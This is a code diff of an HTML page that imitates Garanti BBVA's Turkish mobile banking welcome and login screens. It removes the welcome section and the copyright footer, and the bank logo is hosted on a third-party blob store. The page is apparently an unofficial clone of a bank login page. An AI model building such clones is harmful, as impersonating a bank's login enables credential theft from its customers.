@@ -500,64 +500,7 @@
 
     <!-- Main Content -->
     <div id="main-content">
-        <div class="background"></div>
-        <div class="overlay"></div>
-
-        <div class="header">
-            <div class="notification">
-                <i class="fas fa-bell"></i>
-            </div>
-        </div>
-
-        <div class="welcome">
-            <div class="logo-container">
-                <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/ic_launcher-6PSbTuEIkbaX6TDd1Z7tWc6o3fwxeH.png"
-                    alt="Garanti BBVA Logo">
-            </div>
-            <h2>Garanti BBVA'ya</h2>
-            <h1>Hoş Geldiniz</h1>
-        </div>
-
-        <div class="buttons">
-            <div class="btn btn-primary bgbtn">Bireysel</div>
-            <div class="btn btn-secondary bgbtn">Kurumsal</div>
-        </div>
-
-        <div class="links">
-            <a href="#">Müşterimiz Olun</a>
-            <span class="separator">|</span>
-            <a href="#">En Yakın ATM / Şube</a>
-            <span class="separator">|</span>
-            <a href="#">Bize Ulaşın</a>
-        </div>
-
-        <div class="indicator"></div>
-
-        <div class="features">
-            <div class="feature">
-                <div class="feature-icon">
-                    <span class="fast-text">fas₺</span>
-                </div>
-                <p>FAST İşlemleri</p>
-            </div>
-            <div class="feature">
-                <div class="feature-icon">
-                    <i class="fas fa-money-bill-wave atm-icon"></i>
-                </div>
-                <p>ATM'den Para<br>Çek/Yatır</p>
-            </div>
-            <div class="feature">
-                <div class="feature-icon">
-                    <i class="fas fa-qrcode qr-icon"></i>
-                </div>
-                <p>TR Karekod ile<br>Öde</p>
-            </div>
-        </div>
-    </div>
-
-    <!-- Login Screen -->
-    <div id="login-screen">
-        <div id="page" class="page">
+       <div id="page" class="page">
             <!-- Header -->
             <header id="header">
                 <div class="navbar navbar-default">
@@ -922,45 +865,10 @@
                 </div>
             </div>
         </div>
-
-        <!-- Footer -->
-        <footer id="footer" class="footer no-print">
-            <div class="container">
-                <div class="row patch-footer">
-                    <div class="col-md-4">
-                        <table class="table">
-                            <tbody>
-                                <tr>
-                                    <td>
-                                        <a href="#">Bize Ulaşın</a>
-                                    </td>
-                                    <td class="">
-                                        <a href="#">Güvenlik Bilgileri</a>
-                                    </td>
-                                    <td>
-                                        <span class="language">Language:</span>
-                                        <a href="#">English</a>
-                                    </td>
-                                </tr>
-                            </tbody>
-                        </table>
-                    </div>
-                </div>
-                <div class="row">
-                    <div class="col-sm-8 col-xs-8">
-                        <table class="table">
-                            <tbody>
-                                <tr>
-                                    <td>Copyright © 2025 T.Garanti Bankası A.Ş.</td>
-                                </tr>
-                            </tbody>
-                        </table>
-                    </div>
-                </div>
-            </div>
-        </footer>
-
     </div>
+
+    <!-- Login Screen -->
+   
 
     <script>
         window.onload = function() {
